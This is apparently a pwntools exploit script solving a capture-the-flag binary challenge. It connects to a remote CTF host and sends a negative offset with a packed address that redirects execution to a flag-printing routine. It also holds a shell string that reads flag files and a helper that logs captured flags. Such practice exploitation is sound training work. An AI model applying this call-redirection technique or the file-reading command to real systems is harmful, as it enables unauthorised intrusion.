#!/usr/bin/python3
# -*- coding: utf-8 -*-
#  author: @eastXueLian

from pwn import *
import sys

context.log_level = "debug"
context.arch = "amd64"
context.terminal = ["tmux", "sp", "-h", "-l", "120"]

LOCAL = 0
filename = "./pwn"
if LOCAL:
    io = process(filename)
else:
    remote_service = "ctf.nbs.jonbgua.com 32127"
    remote_service = remote_service.strip().split(" ")
    io = remote(remote_service[0], int(remote_service[1]))

rl = lambda a=False: io.recvline(a)
ru = lambda a, b=True: io.recvuntil(a, b)
rn = lambda x: io.recvn(x)
s = lambda x: io.send(x)
sl = lambda x: io.sendline(x)
sa = lambda a, b: io.sendafter(a, b)
sla = lambda a, b: io.sendlineafter(a, b)
ia = lambda: io.interactive()
dbg = lambda text=None: gdb.attach(io, text)
lg = lambda s: log.info("\033[1;31;40m %s --> 0x%x \033[0m" % (s, eval(s)))
i2b = lambda c: str(c).encode()
u32_ex = lambda data: u32(data.ljust(4, b"\x00"))
u64_ex = lambda data: u64(data.ljust(8, b"\x00"))


def debugPID():
    if LOCAL:
        lg("io.pid")
        input()
    pass


def cmd(data):
    ru(b"cmd> ")
    sl(data)


def call_func(data, idx=0, key=b""):
    cmd(data)
    ru(b"offset: ")
    sl(i2b(idx))
    if data[:1] == b"1":
        ru(b"data: ")
        sl(key)


ru(b":")
sl(input("YOUR TOKEN: ").encode())

# ===========exp starts===========
flag1_addr = 0x0000000000401FFA
call_func(b"-31\x00".ljust(8, b"\x00") + p64(flag1_addr), 0)
# ===========exp ends=============

lg = lambda s: log.info("\033[1;31;40m%s\033[0m" % (s))


def success(flag="", catflag=b"cat ./flag*;cat /*/*/flag*", chal_id=-1):
    if flag == "":
        ru(b"flag{")
        flag = (b"flag{" + ru(b"\n", "drop")).decode()
    assert ("{" in flag) and ("}" in flag)
    if chal_id != -1:
        res = post_flag(flag, chal_id)
        if res:
            if res == -1:
                lg("[WRONG] : " + flag)
                exit()
            elif res == -2:
                import time

                time.sleep(10)
                post_flag(flag, chal_id)
    lg(flag)
    import json

    try:
        with open("./flags.txt", "r") as fd:
            all_flags = json.loads(fd.read())
            for i in all_flags:
                if i["chal_port"] == io.rport:
                    if i["flag"] == flag:
                        exit()
                    else:
                        lg("[Different flag: ]" + i["flag"])
    except Exception:
        all_flags = []
    with open("./flags.txt", "w") as fd:
        chal_data = {"chal_port": io.rport, "flag": flag}
        all_flags.append(chal_data)
        fd.write(
            json.dumps(all_flags, sort_keys=True, indent=4, separators=(",", ": "))
        )
        fd.write("\n")


success()
ia()
